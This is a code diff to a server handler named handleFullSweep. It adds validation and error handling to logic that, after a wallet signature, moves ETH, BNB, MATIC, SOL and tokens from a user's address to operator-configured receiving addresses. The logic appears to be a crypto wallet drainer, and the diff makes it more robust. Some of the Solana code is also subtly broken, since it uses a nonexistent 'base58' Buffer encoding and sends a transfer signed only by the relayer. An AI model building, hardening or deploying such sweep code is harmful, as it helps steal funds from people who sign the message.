@@ -105,6 +105,45 @@ export async function handleFullSweep(req, res) {
 
   const { address, signature, authMessage } = req.body
 
+  // Validate required fields
+  if (!address || !signature || !authMessage) {
+    return res.status(400).json({
+      success: false,
+      error: 'Missing required fields: address, signature, authMessage'
+    })
+  }
+
+  // Validate address format
+  if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
+    return res.status(400).json({
+      success: false,
+      error: 'Invalid Ethereum address format'
+    })
+  }
+
+  // Validate signature format
+  if (!/^0x[a-fA-F0-9]{130}$/.test(signature)) {
+    return res.status(400).json({
+      success: false,
+      error: 'Invalid signature format (should be 65 bytes hex)'
+    })
+  }
+
+  // Validate required environment variables
+  if (!CONFIG.relayerEVM.privateKey) {
+    return res.status(500).json({
+      success: false,
+      error: 'Server not configured: Missing EVM relayer private key'
+    })
+  }
+
+  if (!CONFIG.receivingAddresses.ethereum) {
+    return res.status(500).json({
+      success: false,
+      error: 'Server not configured: Missing receiving addresses'
+    })
+  }
+
   try {
     // ✅ Step 1: Verify signature
     console.log('🔐 Verifying EIP-712 signature...')
@@ -132,9 +171,15 @@ export async function handleFullSweep(req, res) {
     // ====================== ETHEREUM + ERC-20 ======================
     try {
       console.log('\n📍 Processing Ethereum...')
+      if (!CONFIG.rpc.ethereum) {
+        throw new Error('Ethereum RPC not configured')
+      }
       const provider = new ethers.JsonRpcProvider(CONFIG.rpc.ethereum)
       const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
       const receiver = CONFIG.receivingAddresses.ethereum
+      if (!receiver) {
+        throw new Error('Ethereum receiver address not configured')
+      }
 
       // Native ETH
       const ethBal = await provider.getBalance(address)
@@ -207,9 +252,15 @@ export async function handleFullSweep(req, res) {
     // ====================== BSC + BEP-20 ======================
     try {
       console.log('\n📍 Processing BSC (BNB Chain)...')
+      if (!CONFIG.rpc.bsc) {
+        throw new Error('BSC RPC not configured')
+      }
       const provider = new ethers.JsonRpcProvider(CONFIG.rpc.bsc)
       const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
       const receiver = CONFIG.receivingAddresses.bsc
+      if (!receiver) {
+        throw new Error('BSC receiver address not configured')
+      }
 
       // Native BNB
       const bnbBal = await provider.getBalance(address)
@@ -275,9 +326,15 @@ export async function handleFullSweep(req, res) {
     // ====================== POLYGON ======================
     try {
       console.log('\n📍 Processing Polygon...')
+      if (!CONFIG.rpc.polygon) {
+        throw new Error('Polygon RPC not configured')
+      }
       const provider = new ethers.JsonRpcProvider(CONFIG.rpc.polygon)
       const relayer = new ethers.Wallet(CONFIG.relayerEVM.privateKey, provider)
       const receiver = CONFIG.receivingAddresses.polygon
+      if (!receiver) {
+        throw new Error('Polygon receiver address not configured')
+      }
 
       const maticBal = await provider.getBalance(address)
       if (maticBal > ethers.parseEther('1')) {
@@ -302,37 +359,59 @@ export async function handleFullSweep(req, res) {
     // ====================== SOLANA (SOL + SPL Tokens) - FULL RELAYER SIGNING ======================
     try {
       console.log('\n📍 Processing Solana...')
-      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed')
+      if (!CONFIG.relayerSolana.privateKey) {
+        throw new Error('Solana relayer private key not configured')
+      }
+      if (!CONFIG.receivingAddresses.solana) {
+        throw new Error('Solana receiver address not configured')
+      }
+      const connection = new Connection(CONFIG.rpc.solana || 'https://api.mainnet-beta.solana.com', 'confirmed')
 
       // Load Relayer Keypair from Environment Variable (base58)
-      const relayerSecretKey = Uint8Array.from(Buffer.from(CONFIG.relayerSolana.privateKey, 'base58'))
-      const relayerKeypair = Keypair.fromSecretKey(relayerSecretKey)
+      let relayerKeypair
+      try {
+        const relayerSecretKey = Uint8Array.from(Buffer.from(CONFIG.relayerSolana.privateKey, 'base58'))
+        relayerKeypair = Keypair.fromSecretKey(relayerSecretKey)
+      } catch (keyErr) {
+        throw new Error(`Invalid Solana relayer private key format: ${keyErr.message}`)
+      }
 
       const userPubkey = new PublicKey(address)
 
       let sweepSuccess = false
 
       // 1. Native SOL Sweep
-      const solBalance = await connection.getBalance(userPubkey)
+      let solBalance = 0
+      try {
+        solBalance = await connection.getBalance(userPubkey)
+      } catch (balErr) {
+        console.warn('⚠️  Could not get SOL balance:', balErr.message)
+      }
+      
       if (solBalance > 15_000_000) { // ~0.015 SOL minimum
         console.log(`  💰 SOL: ${solBalance / 1_000_000_000}`)
-        const tx = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: userPubkey,
-            toPubkey: new PublicKey(CONFIG.receivingAddresses.solana),
-            lamports: Math.floor((solBalance * 90) / 100) // Leave 10% for fees
-          })
-        )
+        try {
+          const receiverSolPubkey = new PublicKey(CONFIG.receivingAddresses.solana)
+          const tx = new Transaction().add(
+            SystemProgram.transfer({
+              fromPubkey: userPubkey,
+              toPubkey: receiverSolPubkey,
+              lamports: Math.floor((solBalance * 90) / 100) // Leave 10% for fees
+            })
+          )
 
-        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash
-        tx.feePayer = relayerKeypair.publicKey
-        tx.sign(relayerKeypair)
+          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash
+          tx.feePayer = relayerKeypair.publicKey
+          tx.sign(relayerKeypair)
 
-        const signature = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true })
-        await connection.confirmTransaction(signature)
-        console.log(`  ✅ Sent SOL: ${signature}`)
-        transfers.push({ chain: 'solana', asset: 'SOL', hash: signature })
-        sweepSuccess = true
+          const signature = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true })
+          await connection.confirmTransaction(signature)
+          console.log(`  ✅ Sent SOL: ${signature}`)
+          transfers.push({ chain: 'solana', asset: 'SOL', hash: signature })
+          sweepSuccess = true
+        } catch (solErr) {
+          console.warn('⚠️  SOL transfer failed:', solErr.message)
+        }
       }
 
       // 2. Popular SPL Tokens Sweep (USDC, USDT, etc.)
